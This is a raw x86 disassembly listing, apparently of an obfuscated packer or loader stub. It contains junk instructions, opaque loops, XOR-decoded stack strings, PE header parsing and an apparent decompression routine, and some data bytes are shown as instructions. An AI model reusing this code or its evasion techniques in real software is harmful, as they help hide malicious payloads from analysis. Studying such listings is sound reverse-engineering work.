  424d28:	xor    ecx,ecx
  424d2a:	xor    ecx,DWORD PTR ds:0x42a34a
  424d30:	mov    edx,DWORD PTR ds:0x42a396
  424d36:	sub    ecx,edx
  424d38:	add    ecx,DWORD PTR [ecx+edx*1]
  424d3b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424d42:	mov    edx,DWORD PTR ds:0x42a36a
  424d48:	mov    ecx,DWORD PTR ds:0x42a37a
  424d4e:	sub    ecx,edx
  424d50:	or     edx,DWORD PTR [edx+ecx*1]
  424d53:	mov    ecx,DWORD PTR [ebp-0x4]
  424d56:	push   esi
  424d57:	mov    edx,0x75108aa
  424d5c:	movzx  esi,BYTE PTR ds:0x42a286
  424d63:	add    DWORD PTR ds:0x42a29a,esi
  424d69:	xor    ecx,edx
  424d6b:	mov    esi,0x3272f1
  424d70:	xor    DWORD PTR ds:0x42a2b2,0x42a27e
  424d7a:	push   edi
  424d7b:	sbb    DWORD PTR ds:0x42a2ee,0x42a29a
  424d85:	mov    edi,DWORD PTR [ebp+0x10]
  424d88:	add    ecx,esi
  424d8a:	cmp    ecx,edi
  424d8c:	mov    DWORD PTR ds:0x42a2e6,0x5270
  424d96:	je     0x424f0a
  424d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  424d9f:	and    DWORD PTR ds:0x42a2a2,edx
  424da5:	mov    edi,DWORD PTR [ebp+0x10]
  424da8:	add    DWORD PTR ds:0x42a272,0x5748
  424db2:	xor    eax,eax
  424db4:	xor    DWORD PTR ds:0x42a26a,0x1416
  424dbe:	xor    ecx,edx
  424dc0:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424dca:	add    ecx,esi
  424dcc:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424dd6:	add    edi,0xfabdbed8
  424ddc:	adc    eax,0xffffffff
  424ddf:	mov    DWORD PTR ds:0x42a2f6,0x6318
  424de9:	xor    eax,0x0
  424dec:	sbb    DWORD PTR ds:0x42a27e,0x42a2de
  424df6:	mov    DWORD PTR [ebp-0xc],eax
  424df9:	inc    DWORD PTR ds:0x42a27e
  424dff:	push   ebx
  424e00:	xor    DWORD PTR ds:0x42a28e,edi
  424e06:	xor    ebx,ebx
  424e08:	neg    eax
  424e0a:	xor    edi,0x8a29a13d
  424e10:	and    DWORD PTR ds:0x42a2be,0x0
  424e1a:	mov    eax,ds:0x42a2be
  424e1f:	inc    eax
  424e20:	mov    ds:0x42a2be,eax
  424e25:	cmp    DWORD PTR ds:0x42a2be,0x9
  424e2c:	jg     0x424e6f
  424e32:	jmp    0x424e4a
  424e37:	push   0x8c5e
  424e3c:	push   0x42a2a2
  424e41:	push   DWORD PTR [ebp-0x10]
  424e44:	call   DWORD PTR ds:0x42a3ee
  424e4a:	cmp    DWORD PTR ds:0x42a2be,0x8
  424e51:	jne    0x424e62
  424e57:	mov    eax,ds:0x42a2be
  424e5c:	inc    eax
  424e5d:	mov    ds:0x42a2be,eax
  424e62:	cmp    DWORD PTR ds:0x42a2be,0x18
  424e69:	jb     0x424e1a
  424e6f:	mov    eax,ecx
  424e71:	add    eax,0xfabdbed8
  424e76:	adc    ebx,0xffffffff
  424e79:	xor    eax,0x8a29a13d
  424e7e:	xor    ebx,0x0
  424e81:	cmp    eax,edi
  424e83:	jne    0x424e9c
  424e89:	cmp    ebx,DWORD PTR [ebp-0xc]
  424e8c:	je     0x424f04
  424e92:	jmp    0x424e9c
  424e97:	mov    esi,0x3272f1
  424e9c:	mov    eax,DWORD PTR [ebp-0x4]
  424e9f:	mov    edi,DWORD PTR [ebp-0x8]
  424ea2:	xor    edi,edx
  424ea4:	add    edi,esi
  424ea6:	mov    esi,DWORD PTR [ebp+0x8]
  424ea9:	imul   edi,ecx
  424eac:	mov    ebx,DWORD PTR [ebp+0xc]
  424eaf:	xor    eax,edx
  424eb1:	add    eax,ecx
  424eb3:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424eba:	mov    BYTE PTR [edi+esi*1],al
  424ebd:	mov    eax,DWORD PTR [ebp-0x8]
  424ec0:	mov    esi,DWORD PTR [ebp+0x10]
  424ec3:	xor    eax,edx
  424ec5:	xor    ebx,ebx
  424ec7:	add    esi,0xfabdbed8
  424ecd:	adc    ebx,0xffffffff
  424ed0:	lea    ecx,[ecx+eax*1+0x3272f1]
  424ed7:	xor    edi,edi
  424ed9:	xor    esi,0x8a29a13d
  424edf:	xor    ebx,0x0
  424ee2:	mov    eax,ecx
  424ee4:	add    eax,0xfabdbed8
  424ee9:	adc    edi,0xffffffff
  424eec:	xor    eax,0x8a29a13d
  424ef1:	xor    edi,0x0
  424ef4:	cmp    eax,esi
  424ef6:	jne    0x424e97
  424efc:	cmp    edi,ebx
  424efe:	jne    0x424e97
  424f04:	mov    eax,0xf89c85ba
  424f09:	pop    ebx
  424f0a:	pop    edi
  424f0b:	pop    esi
  424f0c:	leave  
  424f0d:	ret    0xc
  424f10:	push   ebp
  424f11:	mov    ebp,esp
  424f13:	push   ecx
  424f14:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424f1b:	or     DWORD PTR ds:0x42a292,0x42a2d6
  424f25:	mov    eax,DWORD PTR [ebp+0x8]
  424f28:	xor    edx,edx
  424f2a:	add    edx,DWORD PTR ds:0x42a3a6
  424f30:	mov    ecx,DWORD PTR ds:0x42a3ae
  424f36:	sub    edx,ecx
  424f38:	sub    edx,DWORD PTR [edx+ecx*1]
  424f3b:	movsx  eax,BYTE PTR [eax]
  424f3e:	mov    edx,0x3272f1
  424f43:	sub    eax,edx
  424f45:	movzx  ecx,BYTE PTR ds:0x42a2a6
  424f4c:	or     DWORD PTR ds:0x42a2ce,ecx
  424f52:	mov    ecx,0x75108aa
  424f57:	and    DWORD PTR ds:0x42a2d2,0x2b27
  424f61:	xor    eax,ecx
  424f63:	cmp    eax,0xf89c85f6
  424f68:	mov    DWORD PTR ds:0x42a28e,0x60e7
  424f72:	jne    0x424fc5
  424f78:	xor    eax,eax
  424f7a:	xor    eax,DWORD PTR ds:0x42a26a
  424f80:	xor    DWORD PTR ds:0x42a2ba,eax
  424f86:	mov    eax,DWORD PTR [ebp+0x8]
  424f89:	mov    DWORD PTR ds:0x42a2d6,0x3461
  424f93:	push   esi
  424f94:	mov    esi,DWORD PTR ds:0x42a262
  424f9a:	adc    DWORD PTR ds:0x42a256,esi
  424fa0:	mov    esi,DWORD PTR [ebp+0x8]
  424fa3:	add    esi,DWORD PTR [eax+0x3c]
  424fa6:	mov    DWORD PTR [ebp+0x8],esi
  424fa9:	mov    eax,DWORD PTR [ebp-0x4]
  424fac:	mov    esi,DWORD PTR [ebp+0x8]
  424faf:	xor    eax,ecx
  424fb1:	add    eax,edx
  424fb3:	cmp    DWORD PTR [esi+0x54],eax
  424fb6:	pop    esi
  424fb7:	je     0x424fc5
  424fbd:	mov    eax,DWORD PTR [ebp+0x8]
  424fc0:	jmp    0x424fcc
  424fc5:	mov    eax,DWORD PTR [ebp-0x4]
  424fc8:	xor    eax,ecx
  424fca:	add    eax,edx
  424fcc:	leave  
  424fcd:	ret    0x4
  424fd0:	push   ebp
  424fd1:	mov    ebp,esp
  424fd3:	sub    esp,0xc
  424fd6:	and    DWORD PTR ds:0x42a2da,0x0
  424fe0:	jmp    0x424ff4
  424fe5:	xor    edx,edx
  424fe7:	or     edx,DWORD PTR ds:0x42a2da
  424fed:	inc    edx
  424fee:	mov    DWORD PTR ds:0x42a2da,edx
  424ff4:	cmp    DWORD PTR ds:0x42a2da,0x1c
  424ffb:	jae    0x425040
  425001:	cmp    DWORD PTR ds:0x42a2da,0x7
  425008:	jg     0x425040
  42500e:	jmp    0x425021
  425013:	push   DWORD PTR [ebp-0x10]
  425016:	push   0x42a276
  42501b:	call   DWORD PTR ds:0x42a3f2
  425021:	cmp    DWORD PTR ds:0x42a2da,0x6
  425028:	jne    0x42503b
  42502e:	mov    edx,DWORD PTR ds:0x42a2da
  425034:	inc    edx
  425035:	mov    DWORD PTR ds:0x42a2da,edx
  42503b:	jmp    0x424fe5
  425040:	push   esi
  425041:	sub    esi,0x6177
  425047:	mov    esi,0xf89c85a5
  42504c:	and    DWORD PTR ds:0x42a26a,0x14cd
  425056:	mov    DWORD PTR [ebp-0x8],esi
  425059:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  425060:	and    DWORD PTR ds:0x42a2e2,ebx
  425066:	push   edi
  425067:	mov    eax,eax
  425069:	or     ecx,0x7f14
  42506f:	mov    eax,DWORD PTR [ebp-0x4]
  425072:	add    ecx,edi
  425074:	mov    edi,DWORD PTR [ebp-0x8]
  425077:	or     edx,edx
  425079:	mov    ecx,0x75108aa
  42507e:	and    DWORD PTR ds:0x42a2da,0x0
  425088:	jmp    0x42509a
  42508d:	mov    edx,DWORD PTR ds:0x42a2da
  425093:	inc    edx
  425094:	mov    DWORD PTR ds:0x42a2da,edx
  42509a:	cmp    DWORD PTR ds:0x42a2da,0x1d
  4250a1:	jae    0x4250e3
  4250a7:	cmp    DWORD PTR ds:0x42a2da,0xd
  4250ae:	jge    0x4250e3
  4250b4:	jmp    0x4250c4
  4250b9:	push   0x42a2d2
  4250be:	call   DWORD PTR ds:0x42a3f6
  4250c4:	cmp    DWORD PTR ds:0x42a2da,0xc
  4250cb:	jne    0x4250de
  4250d1:	mov    edx,DWORD PTR ds:0x42a2da
  4250d7:	inc    edx
  4250d8:	mov    DWORD PTR ds:0x42a2da,edx
  4250de:	jmp    0x42508d
  4250e3:	xor    eax,ecx
  4250e5:	xor    edi,ecx
  4250e7:	mov    edx,0x3272f1
  4250ec:	add    edi,edx
  4250ee:	add    eax,edx
  4250f0:	imul   eax,edi
  4250f3:	mov    edi,DWORD PTR [ebp+0xc]
  4250f6:	cmp    edi,eax
  4250f8:	je     0x42514d
  4250fe:	mov    DWORD PTR [ebp-0xc],esi
  425101:	mov    eax,DWORD PTR [ebp-0xc]
  425104:	mov    esi,DWORD PTR [ebp+0xc]
  425107:	xor    eax,ecx
  425109:	lea    eax,[eax*8+0x1939800]
  425110:	mov    eax,DWORD PTR [esi+eax*1]
  425113:	mov    DWORD PTR [ebp+0xc],eax
  425116:	mov    eax,DWORD PTR [ebp-0x4]
  425119:	mov    esi,DWORD PTR [ebp-0x8]
  42511c:	xor    eax,ecx
  42511e:	xor    esi,ecx
  425120:	add    esi,edx
  425122:	add    eax,edx
  425124:	imul   eax,esi
  425127:	mov    esi,DWORD PTR [ebp+0xc]
  42512a:	cmp    esi,eax
  42512c:	je     0x42514d
  425132:	mov    eax,DWORD PTR [ebp-0x4]
  425135:	xor    eax,ecx
  425137:	mov    ecx,DWORD PTR [ebp+0xc]
  42513a:	add    eax,edx
  42513c:	imul   eax,ecx
  42513f:	add    eax,DWORD PTR [ebp+0x8]
  425142:	mov    DWORD PTR [ebp+0xc],eax
  425145:	mov    eax,DWORD PTR [ebp+0xc]
  425148:	jmp    0x42515e
  42514d:	mov    eax,DWORD PTR [ebp-0x4]
  425150:	mov    esi,DWORD PTR [ebp-0x8]
  425153:	xor    esi,ecx
  425155:	xor    eax,ecx
  425157:	add    esi,edx
  425159:	add    eax,edx
  42515b:	imul   eax,esi
  42515e:	pop    edi
  42515f:	pop    esi
  425160:	leave  
  425161:	ret    0x8
	...
  425174:	mov    ch,0x45
  425176:	out    0x4d,al
  425178:	add    BYTE PTR [eax],al
  42517a:	add    BYTE PTR [eax],al
  42517c:	add    al,BYTE PTR [eax]
  42517e:	add    BYTE PTR [eax],al
  425180:	xor    BYTE PTR [eax],al
  425182:	add    BYTE PTR [eax],al
  425184:	nop
  425185:	push   ecx
  425186:	add    al,BYTE PTR [eax]
  425188:	nop
  425189:	inc    ebp
  42518a:	add    al,BYTE PTR [eax]
  42518c:	add    BYTE PTR [eax],al
  42518e:	add    BYTE PTR [eax],al
  425190:	push   edx
  425191:	push   ebx
  425192:	inc    esp
  425193:	push   ebx
  425194:	pop    edi
  425195:	dec    ecx
  425196:	fmulp  st(7),st
  425198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425199:	retf   0x4538
  42519c:	mov    ds:0xad27ff06,al
  4251a1:	mov    al,0x1
  4251a3:	jmp    0x3a46:0x1
  4251aa:	pop    esp
  4251ab:	push   edi
  4251ac:	imul   ebp,DWORD PTR [esi+0x64],0x2073776f
  4251b3:	inc    esp
  4251b4:	imul   esi,DWORD PTR [edx+0x5c],0x656c6946
  4251bb:	inc    ebp
  4251bc:	js     0x425223
  4251be:	arpl   WORD PTR [eax],ax
  4251c0:	mov    edx,DWORD PTR [ebp-0x14]
  4251c3:	sub    esp,0x108
  4251c9:	push   ebx
  4251ca:	mov    eax,ebx
  4251cc:	xchg   ecx,eax
  4251cd:	mov    eax,DWORD PTR [ebp+0x8]
  4251d0:	cmp    eax,0xf89c85a5
  4251d5:	jne    0x42568f
  4251db:	mov    eax,DWORD PTR [ebp+0xc]
  4251de:	cmp    eax,0xf89c85ba
  4251e3:	jne    0x42568f
  4251e9:	mov    eax,DWORD PTR [ebp+0x24]
  4251ec:	mov    DWORD PTR [ebp-0x4],eax
  4251ef:	mov    eax,DWORD PTR [ebp-0x4]
  4251f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4251f8:	mov    eax,DWORD PTR [eax]
  4251fa:	mov    eax,DWORD PTR [eax]
  4251fc:	mov    DWORD PTR [ebp-0x8],eax
  4251ff:	mov    BYTE PTR [ebp-0x18],0x1a
  425203:	mov    BYTE PTR [ebp-0x17],0x1f
  425207:	mov    BYTE PTR [ebp-0x16],0x14
  42520b:	mov    BYTE PTR [ebp-0x15],0x4e
  42520f:	mov    BYTE PTR [ebp-0x14],0x4d
  425213:	mov    BYTE PTR [ebp-0x13],0x83
  425217:	mov    BYTE PTR [ebp-0x20],0x8
  42521b:	mov    BYTE PTR [ebp-0x1f],0xe
  42521f:	mov    BYTE PTR [ebp-0x1e],0x18
  425223:	mov    BYTE PTR [ebp-0x1d],0xd
  425227:	mov    BYTE PTR [ebp-0x1c],0x4e
  42522b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42522f:	mov    BYTE PTR [ebp-0x1a],0x83
  425233:	mov    BYTE PTR [ebp-0x28],0xe
  425237:	mov    BYTE PTR [ebp-0x27],0x1b
  42523b:	mov    BYTE PTR [ebp-0x26],0x17
  42523f:	mov    BYTE PTR [ebp-0x25],0xa
  425243:	mov    BYTE PTR [ebp-0x24],0x1c
  425247:	mov    BYTE PTR [ebp-0x23],0x13
  42524b:	mov    BYTE PTR [ebp-0x22],0x14
  42524f:	mov    BYTE PTR [ebp-0x21],0x83
  425253:	xor    ecx,ecx
  425255:	lea    eax,[ebp+ecx*1-0x18]
  425259:	movzx  edx,BYTE PTR [eax]
  42525c:	xor    edx,0x7c
  42525f:	inc    edx
  425260:	inc    ecx
  425261:	mov    BYTE PTR [eax],dl
  425263:	cmp    ecx,0x6
  425266:	jb     0x425255
  425268:	xor    ecx,ecx
  42526a:	lea    eax,[ebp+ecx*1-0x20]
  42526e:	movzx  edx,BYTE PTR [eax]
  425271:	xor    edx,0x7c
  425274:	inc    edx
  425275:	inc    ecx
  425276:	mov    BYTE PTR [eax],dl
  425278:	cmp    ecx,0x7
  42527b:	jb     0x42526a
  42527d:	xor    ecx,ecx
  42527f:	lea    eax,[ebp+ecx*1-0x28]
  425283:	movzx  edx,BYTE PTR [eax]
  425286:	xor    edx,0x7c
  425289:	inc    edx
  42528a:	inc    ecx
  42528b:	mov    BYTE PTR [eax],dl
  42528d:	cmp    ecx,0x8
  425290:	jb     0x42527f
  425292:	lea    eax,[ebp-0x2c]
  425295:	mov    DWORD PTR [ebp-0x8],eax
  425298:	mov    ecx,DWORD PTR [ebp-0x8]
  42529b:	mov    eax,0x7113fccf
  4252a0:	mov    DWORD PTR [ecx],eax
  4252a2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4252a5:	push   esi
  4252a6:	push   edi
  4252a7:	mov    esi,0x4e3e
  4252ac:	mov    ebx,0x3272f1
  4252b1:	cmp    ecx,eax
  4252b3:	jne    0x42537e
  4252b9:	lea    eax,[esi+0x39]
  4252bc:	mov    WORD PTR [ebp-0x78],ax
  4252c0:	mov    eax,esi
  4252c2:	mov    WORD PTR [ebp-0x76],ax
  4252c6:	add    eax,0x33
  4252c9:	mov    WORD PTR [ebp-0x74],ax
  4252cd:	lea    eax,[esi-0xe]
  4252d0:	mov    WORD PTR [ebp-0x72],ax
  4252d4:	add    eax,0x4f
  4252d7:	mov    ecx,eax
  4252d9:	lea    eax,[esi-0x15]
  4252dc:	mov    WORD PTR [ebp-0x66],ax
  4252e0:	mov    eax,esi
  4252e2:	mov    WORD PTR [ebp-0x64],ax
  4252e6:	add    eax,0xffffffec
  4252e9:	mov    WORD PTR [ebp-0x62],ax
  4252ed:	mov    eax,0x443
  4252f2:	mov    WORD PTR [ebp-0x60],ax
  4252f6:	mov    eax,0x5674
  4252fb:	mov    WORD PTR [ebp-0x5e],ax
  4252ff:	mov    eax,0x6114
  425304:	mov    WORD PTR [ebp-0x5c],ax
  425308:	lea    eax,[ebp-0xe0]
  42530e:	push   eax
  42530f:	mov    eax,DWORD PTR [ebp+0xc]
  425312:	mov    edi,0x75108aa
  425317:	xor    eax,edi
  425319:	add    eax,ebx
  42531b:	push   eax
  42531c:	mov    WORD PTR [ebp-0x70],cx
  425320:	lea    ecx,[esi-0xa]
  425323:	mov    edx,ecx
  425325:	lea    eax,[ebp-0x78]
  425328:	push   eax
  425329:	mov    eax,DWORD PTR [ebp-0x4]
  42532c:	mov    eax,DWORD PTR [eax+0x198]
  425332:	mov    WORD PTR [ebp-0x6e],dx
  425336:	mov    edx,0x4f8a
  42533b:	mov    WORD PTR [ebp-0x6c],dx
  42533f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425346:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42534d:	mov    DWORD PTR [ebp-0xe0],0x1
  425357:	mov    DWORD PTR [ebp-0xdc],0x255
  425361:	push   DWORD PTR [eax]
  425363:	mov    eax,DWORD PTR [ebp+0x10]
  425366:	call   eax
  425368:	mov    DWORD PTR [ebp-0x8],eax
  42536b:	mov    eax,DWORD PTR [ebp-0x8]
  42536e:	test   eax,eax
  425370:	je     0x425383
  425372:	xor    DWORD PTR ds:0x76586876,0x87687666
  42537c:	jmp    0x425383
  42537e:	mov    edi,0x75108aa
  425383:	mov    eax,DWORD PTR [ebp-0x4]
  425386:	mov    ecx,DWORD PTR [eax+0x18c]
  42538c:	xor    eax,eax
  42538e:	cmp    DWORD PTR [ecx],eax
  425390:	jne    0x425602
  425396:	mov    ecx,DWORD PTR [ebp-0x4]
  425399:	mov    ecx,DWORD PTR [ecx+0x17c]
  42539f:	mov    DWORD PTR [ecx],eax
  4253a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4253a4:	mov    ecx,DWORD PTR [ecx+0x180]
  4253aa:	mov    DWORD PTR [ecx],eax
  4253ac:	mov    eax,0x4e61
  4253b1:	mov    WORD PTR [ebp-0x9c],ax
  4253b8:	mov    eax,esi
  4253ba:	mov    WORD PTR [ebp-0x9a],ax
  4253c1:	mov    eax,0x4e71
  4253c6:	mov    WORD PTR [ebp-0x98],ax
  4253cd:	add    eax,0xffffffc0
  4253d0:	mov    WORD PTR [ebp-0x96],ax
  4253d7:	mov    eax,0x4f8e
  4253dc:	mov    WORD PTR [ebp-0x94],ax
  4253e3:	mov    eax,0x4e32
  4253e8:	mov    WORD PTR [ebp-0x92],ax
  4253ef:	add    eax,0x4d
  4253f2:	mov    WORD PTR [ebp-0x90],ax
  4253f9:	mov    eax,0x4e34
  4253fe:	mov    WORD PTR [ebp-0x8e],ax
  425405:	mov    eax,esi
  425407:	mov    WORD PTR [ebp-0x8c],ax
  42540e:	mov    eax,0x4e35
  425413:	mov    WORD PTR [ebp-0x8a],ax
  42541a:	mov    eax,0x99f1
  42541f:	mov    WORD PTR [ebp-0x88],ax
  425426:	mov    eax,0x8d62
  42542b:	mov    WORD PTR [ebp-0x86],ax
  425432:	mov    eax,0xd66f
  425437:	mov    WORD PTR [ebp-0x84],ax
  42543e:	mov    eax,0xd783
  425443:	mov    WORD PTR [ebp-0x82],ax
  42544a:	mov    eax,0x2784
  42544f:	mov    WORD PTR [ebp-0x80],ax
  425453:	mov    eax,0x4784
  425458:	mov    WORD PTR [ebp-0x7e],ax
  42545c:	mov    eax,0x4e33
  425461:	push   0x8
  425463:	mov    WORD PTR [ebp-0x7c],ax
  425467:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42546e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  425475:	lea    eax,[ebp-0x10]
  425478:	pop    ecx
  425479:	mov    dl,BYTE PTR [eax]
  42547b:	xor    dl,0x7c
  42547e:	inc    dl
  425480:	mov    BYTE PTR [eax],dl
  425482:	inc    eax
  425483:	dec    ecx
  425484:	jne    0x425479
  425486:	lea    eax,[ebp-0x10]
  425489:	mov    DWORD PTR [ebp-0xdc],eax
  42548f:	lea    eax,[ebp-0xe0]
  425495:	push   eax
  425496:	mov    eax,DWORD PTR [ebp+0xc]
  425499:	xor    eax,edi
  42549b:	add    eax,ebx
  42549d:	push   eax
  42549e:	mov    eax,DWORD PTR [ebp-0x4]
  4254a1:	add    eax,0x66
  4254a4:	push   eax
  4254a5:	mov    eax,DWORD PTR [ebp-0x4]
  4254a8:	mov    eax,DWORD PTR [eax+0x198]
  4254ae:	mov    DWORD PTR [ebp-0xe0],0x1
  4254b8:	push   DWORD PTR [eax]
  4254ba:	mov    eax,DWORD PTR [ebp+0x10]
  4254bd:	call   eax
  4254bf:	mov    ecx,DWORD PTR [ebp+0x8]
  4254c2:	xor    ecx,edi
  4254c4:	add    ecx,ebx
  4254c6:	mov    DWORD PTR [ebp-0x8],eax
  4254c9:	cmp    eax,ecx
  4254cb:	jne    0x4254e6
  4254cd:	mov    eax,ds:0x33730bcc
  4254d2:	or     eax,0x22150bcf
  4254d7:	mov    ds:0x33730bcc,eax
  4254dc:	add    eax,0x3372e92f
  4254e1:	mov    ds:0x33730bcc,eax
  4254e6:	mov    ecx,0x4e66
  4254eb:	mov    eax,ecx
  4254ed:	mov    WORD PTR [ebp-0x40],ax
  4254f1:	add    eax,0x5
  4254f4:	mov    edx,eax
  4254f6:	mov    WORD PTR [ebp-0x3e],dx
  4254fa:	mov    edx,0x4f93
  4254ff:	mov    WORD PTR [ebp-0x3c],dx
  425503:	add    edx,0xfffffff8
  425506:	mov    WORD PTR [ebp-0x3a],dx
  42550a:	mov    edx,0x4f8d
  42550f:	mov    WORD PTR [ebp-0x38],dx
  425513:	add    edx,0xfffffff3
  425516:	mov    WORD PTR [ebp-0x36],dx
  42551a:	mov    edx,0x4f87
  42551f:	mov    WORD PTR [ebp-0x34],dx
  425523:	mov    WORD PTR [ebp-0x32],cx
  425527:	mov    ecx,esi
  425529:	mov    WORD PTR [ebp-0x30],cx
  42552d:	lea    ecx,[edx-0x1]
  425530:	mov    edx,ecx
  425532:	mov    WORD PTR [ebp-0x54],dx
  425536:	mov    edx,eax
  425538:	mov    WORD PTR [ebp-0x52],dx
  42553c:	mov    edx,0x4e73
  425541:	mov    WORD PTR [ebp-0x50],dx
  425545:	mov    WORD PTR [ebp-0x4e],ax
  425549:	lea    eax,[edx-0x6]
  42554c:	mov    WORD PTR [ebp-0x4c],ax
  425550:	add    eax,0xfffffff3
  425553:	mov    WORD PTR [ebp-0x4a],ax
  425557:	lea    eax,[edx-0xc]
  42555a:	mov    WORD PTR [ebp-0x48],ax
  42555e:	mov    WORD PTR [ebp-0x46],cx
  425562:	mov    WORD PTR [ebp-0x44],si
  425566:	mov    eax,DWORD PTR [ebp+0x8]
  425569:	movzx  ecx,WORD PTR [ebp-0x54]
  42556d:	xor    eax,edi
  42556f:	add    eax,ebx
  425571:	xor    eax,ecx
  425573:	mov    WORD PTR [ebp-0x54],ax
  425577:	mov    eax,DWORD PTR [ebp+0x8]
  42557a:	movzx  ecx,WORD PTR [ebp-0x40]
  42557e:	xor    eax,edi
  425580:	add    eax,ebx
  425582:	xor    eax,ecx
  425584:	mov    WORD PTR [ebp-0x40],ax
  425588:	xor    eax,eax
  42558a:	mov    WORD PTR [ebp-0xf4],ax
  425591:	mov    WORD PTR [ebp-0x108],ax
  425598:	mov    edi,DWORD PTR [ebp+0x24]
  42559b:	lea    eax,[ebp-0xf4]
  4255a1:	lea    edx,[ebp-0x54]
  4255a4:	mov    DWORD PTR [ebp-0xe0],0x2
  4255ae:	mov    DWORD PTR [ebp-0xdc],eax
  4255b4:	call   0x427feb
  4255b9:	mov    DWORD PTR [ebp-0xd8],eax
  4255bf:	lea    eax,[ebp-0xe0]
  4255c5:	push   eax
  4255c6:	mov    eax,DWORD PTR [ebp+0xc]
  4255c9:	xor    eax,0x75108aa
  4255ce:	add    eax,ebx
  4255d0:	push   eax
  4255d1:	lea    eax,[ebp-0x9c]
  4255d7:	push   eax
  4255d8:	push   DWORD PTR [ebp-0x8]
  4255db:	mov    eax,DWORD PTR [ebp+0x10]
  4255de:	call   eax
  4255e0:	mov    edi,DWORD PTR [ebp+0x24]
  4255e3:	lea    eax,[ebp-0x108]
  4255e9:	lea    edx,[ebp-0x40]
  4255ec:	mov    DWORD PTR [ebp-0xdc],eax
  4255f2:	call   0x427feb
  4255f7:	mov    DWORD PTR [ebp-0xd8],eax
  4255fd:	mov    edi,0x75108aa
  425602:	mov    eax,DWORD PTR [ebp+0x14]
  425605:	push   DWORD PTR [ebp-0x4]
  425608:	push   DWORD PTR [ebp+0x20]
  42560b:	push   DWORD PTR [ebp+0x1c]
  42560e:	push   DWORD PTR [ebp+0x18]
  425611:	push   DWORD PTR [ebp+0x10]
  425614:	push   DWORD PTR [ebp+0x8]
  425617:	push   DWORD PTR [ebp+0xc]
  42561a:	call   0x42688c
  42561f:	test   eax,eax
  425621:	je     0x425665
  425623:	add    DWORD PTR [ebp-0x4],eax
  425626:	push   DWORD PTR [ebp-0x4]
  425629:	lea    esi,[ebp+0x4]
  42562c:	call   0x425a7d
  425631:	mov    eax,DWORD PTR [ebp-0x4]
  425634:	mov    eax,DWORD PTR [eax+0x1c8]
  42563a:	mov    eax,DWORD PTR [eax]
  42563c:	xor    eax,edi
  42563e:	add    eax,ebx
  425640:	mov    eax,DWORD PTR [ebp-0x4]
  425643:	jne    0x42565b
  425645:	mov    ecx,DWORD PTR [ebp-0x4]
  425648:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42564e:	push   DWORD PTR [ecx]
  425650:	mov    eax,DWORD PTR [eax+0x1e0]
  425656:	call   DWORD PTR [eax+0x28]
  425659:	jmp    0x425665
  42565b:	mov    eax,DWORD PTR [eax+0x17c]
  425661:	mov    eax,DWORD PTR [eax]
  425663:	add    DWORD PTR [esi],eax
  425665:	mov    eax,DWORD PTR [ebp-0x4]
  425668:	mov    eax,DWORD PTR [eax+0x1dc]
  42566e:	dec    DWORD PTR [eax]
  425670:	mov    ecx,DWORD PTR [ebp-0x4]
  425673:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425679:	mov    eax,DWORD PTR [eax]
  42567b:	lea    eax,[ecx+eax*4]
  42567e:	mov    ecx,DWORD PTR [ebp-0x4]
  425681:	mov    ecx,DWORD PTR [ecx+0x17c]
  425687:	mov    eax,DWORD PTR [eax]
  425689:	mov    ecx,DWORD PTR [ecx]
  42568b:	add    DWORD PTR [eax],ecx
  42568d:	pop    edi
  42568e:	pop    esi
  42568f:	pop    ebx
  425690:	leave  
  425691:	ret    0x20
  425694:	push   edi
  425695:	push   esi
  425696:	push   ebx
  425697:	push   ebp
  425698:	mov    ebp,esp
  42569a:	mov    eax,DWORD PTR [ebp+0x24]
  42569d:	add    DWORD PTR [ebp+0x28],eax
  4256a0:	push   eax
  4256a1:	cld    
  4256a2:	mov    esi,DWORD PTR [ebp+0x18]
  4256a5:	add    DWORD PTR [ebp+0x1c],esi
  4256a8:	push   esi
  4256a9:	mov    esi,DWORD PTR [ebp+0x14]
  4256ac:	lods   eax,DWORD PTR ds:[esi]
  4256ad:	xchg   edx,eax
  4256ae:	push   edx
  4256af:	mov    cl,BYTE PTR [esi-0x2]
  4256b2:	or     eax,0xffffffff
  4256b5:	shl    eax,cl
  4256b7:	not    eax
  4256b9:	push   eax
  4256ba:	mov    cl,dh
  4256bc:	or     eax,0xffffffff
  4256bf:	shl    eax,cl
  4256c1:	not    eax
  4256c3:	push   eax
  4256c4:	add    cl,dl
  4256c6:	mov    edi,esi
  4256c8:	sub    esp,0xc
  4256cb:	sub    eax,eax
  4256cd:	inc    eax
  4256ce:	push   eax
  4256cf:	push   eax
  4256d0:	push   eax
  4256d1:	push   eax
  4256d2:	push   eax
  4256d3:	push   edi
  4256d4:	sub    esi,esi
  4256d6:	push   esi
  4256d7:	or     ebx,0xffffffff
  4256da:	mov    eax,0x300
  4256df:	shl    eax,cl
  4256e1:	lea    ecx,[eax+0x736]
  4256e7:	mov    eax,0x4000400
  4256ec:	shr    ecx,1
  4256ee:	rep stos DWORD PTR es:[edi],eax
  4256f0:	push   0x5
  4256f2:	pop    ecx
  4256f3:	call   0x4259de
  4256f8:	loop   0x4256f3
  4256fa:	lea    esi,[esi]
  4256fc:	lea    edi,[edi]
  4256fe:	mov    edi,DWORD PTR [ebp-0x4]
  425701:	mov    eax,DWORD PTR [ebp-0x10]
  425704:	sub    edi,DWORD PTR [ebp+0x24]
  425707:	and    eax,edi
  425709:	mov    DWORD PTR [ebp-0x18],eax
  42570c:	mov    al,0x0
  42570e:	call   0x4259f6
  425713:	jne    0x4257ae
  425719:	mov    cl,BYTE PTR [ebp-0xc]
  42571c:	and    edi,DWORD PTR [ebp-0x14]
  42571f:	shl    edi,cl
  425721:	sub    cl,0x8
